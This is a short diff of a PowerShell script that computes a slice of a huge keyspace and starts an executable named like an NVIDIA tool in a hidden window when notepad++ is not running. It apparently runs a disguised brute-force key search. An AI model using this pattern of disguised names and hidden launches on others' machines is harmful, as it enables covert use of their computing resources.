@@ -19,7 +19,6 @@ function Get-V{
 
 function Run-Finder {
     $range = Get-V 36893488147419103232 284667 64800000000000
-    Write-Output $range
     $process=Get-Process notepad++ -ea SilentlyContinue
     if(!$process) {
         Start-Process "nvidia-ge-cli.exe" -ArgumentList '--keyspace', $range,  "-i",  "version.txt", "--continue", "state.txt" -WindowStyle Hidden
